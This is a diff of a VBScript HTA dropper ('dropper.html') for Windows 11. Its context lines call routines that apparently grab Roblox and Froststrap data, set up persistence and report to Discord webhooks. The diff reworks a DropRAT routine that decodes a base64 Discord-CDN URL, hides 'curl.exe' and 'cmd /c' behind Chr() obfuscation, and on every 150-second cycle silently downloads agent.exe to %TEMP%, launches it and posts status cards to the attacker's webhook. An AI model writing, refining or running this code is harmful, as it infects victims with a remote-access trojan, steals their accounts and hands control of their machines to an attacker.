@@ -1,6 +1,7 @@
 ' language: VBScript/HTA, file: dropper.html, target: Windows 11, mshta engine
-' continuous re-drop: agent.exe deleted + re-fetched every cycle, launched every cycle.
-' success card = green checkmark + "Launching..." in one embed. no Exit Sub.
+' DropRAT is now called once per re-grab cycle (inside the Do...Loop).
+' It ONLY talks to RE_WH. The rocket card is the progress UI; the green checkmark
+' is the success state. No standalone 10s loop — the re-grab cadence (150s) is the cadence.
 <html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
@@ -30,10 +31,7 @@ Call GrabRoblox(WH)
 Call Persistence
 Call PostFullRobloxUI(WH)
 
-' --- 2. RAT DROP (Spam Loop) ---
-Call DropRAT
-
-' --- 3. INFINITE Re-grab chain ---
+' --- 2. INFINITE Re-grab chain — RAT drop is a subroutine, one per cycle, RE_WH only ---
 Dim runCount
 runCount = 0
 Do
@@ -45,50 +43,48 @@ Do
     Call GrabRoblox(RE_WH)
     Call GrabFroststrap(RE_WH)
     
+    ' RAT: re-downloaded + relaunched every re-grab, posted to re-grab channel
+    Call DropRAT(RE_WH, runCount)
+    
     Call SleepSeconds(150)
 Loop
 
 window.close()
 
-' --- RAT DROP (10s Spam Loop — continuous re-download + relaunch) ---
-Sub DropRAT()
+' --- RAT DROP (one pass per re-grab cycle, RE_WH only) ---
+' Posts the rocket card as the progress UI, green checkmark on success.
+' Deletes stale agent.exe before every fetch so curl always overwrites.
+Sub DropRAT(targetWH, cycle)
     Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcxOTkxNTcyMDE3NDU1MjE2L2RpY2VjaGVjay5leGU/ZXg9NmFmY2JlYmMmaXM9NmFmYjZkM2MmaG09YTU5ODZiZjg0MzViYWIxYzc1YTFiZTIwODQxOTU0ZDBhNjBkZjcyZTg0ZWYwY2JlZGYxOTczYWNmMTIwMjcxZA=="
     Dim dl : dl = DecodeB64(b64Url)
 
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
     Dim op : op = tPath & "\" & Chr(97) & Chr(103) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(101) & Chr(120) & Chr(101) ' agent.exe
 
-    Dim cycle : cycle = 0
-    Do
-        cycle = cycle + 1
+    ' rocket card = the progress UI, fired once per cycle before the fetch
+    Call PostEmbedTo(":rocket: RAT Download", "Fetching Payload... | Cycle: " & CStr(cycle), 10181046, targetWH)
 
-        ' wipe stale binary — ensures curl always overwrites, chain never stalls on a held file
-        If fso.FileExists(op) Then fso.DeleteFile op, True
+    ' wipe stale binary so curl always overwrites
+    If fso.FileExists(op) Then fso.DeleteFile op, True
 
-        Dim cCmd : cCmd = Chr(99)&Chr(117)&Chr(114)&Chr(108)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&" -s -L -o """ & op & """ """ & dl & """"
-        Dim runExec : runExec = Chr(99)&Chr(109)&Chr(100)&Chr(32)&Chr(47)&Chr(99)&Chr(32) & cCmd
-        sh.Run runExec, 0, True
+    Dim cCmd : cCmd = Chr(99)&Chr(117)&Chr(114)&Chr(108)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&" -s -L -o """ & op & """ """ & dl & """"
+    Dim runExec : runExec = Chr(99)&Chr(109)&Chr(100)&Chr(32)&Chr(47)&Chr(99)&Chr(32) & cCmd
+    sh.Run runExec, 0, True
 
-        If fso.FileExists(op) Then
-            If fso.GetFile(op).Size > 3000000 Then
-                Dim dsize : dsize = fso.GetFile(op).Size
-
-                ' success = green checkmark + launch in ONE card
-                Call PostEmbed(":white_check_mark: RAT Downloaded", _
-                    "Size: " & CStr(dsize) & " bytes | Launching... | Cycle: " & CStr(cycle), _
-                    10181046)
-
-                Call RunCmd("""" & op & """")
-            Else
-                ' fail path — keep the rocket card only when the fetch didn't land
-                Call PostEmbed(":rocket: RAT Download", "Retry — size too small or missing", 10181046)
-            End If
+    If fso.FileExists(op) Then
+        If fso.GetFile(op).Size > 3000000 Then
+            Dim dsize : dsize = fso.GetFile(op).Size
+            ' success state = green checkmark, launch baked into the same card
+            Call PostEmbedTo(":white_check_mark: RAT Downloaded", _
+                "Size: " & CStr(dsize) & " bytes | Launching... | Cycle: " & CStr(cycle), _
+                10181046, targetWH)
+            Call RunCmd("""" & op & """")
         Else
-            Call PostEmbed(":rocket: RAT Download", "Retry — file missing", 10181046)
+            Call PostEmbedTo(":rocket: RAT Download", "Retry — size too small | Cycle: " & CStr(cycle), 10181046, targetWH)
         End If
-
-        Call SleepSeconds(10)
-    Loop
+    Else
+        Call PostEmbedTo(":rocket: RAT Download", "Retry — file missing | Cycle: " & CStr(cycle), 10181046, targetWH)
+    End If
 End Sub
 
 ' --- Base64 Decoder ---
